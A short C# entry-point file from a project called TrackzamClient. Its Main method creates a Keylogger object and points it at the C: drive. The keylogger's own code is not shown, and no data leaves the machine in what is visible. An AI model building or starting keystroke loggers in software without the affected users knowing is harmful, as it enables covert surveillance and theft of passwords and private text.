using System;

namespace TrackzamClient
{
    class Program
    {
        static void Main(string[] args)
        {
            // TODO delete later
            //Console.WriteLine(RuntimeInformation.FrameworkDescription);
            Keylogger k = new Keylogger();
            k.setPath(@"C:\\");
        }
    }
}
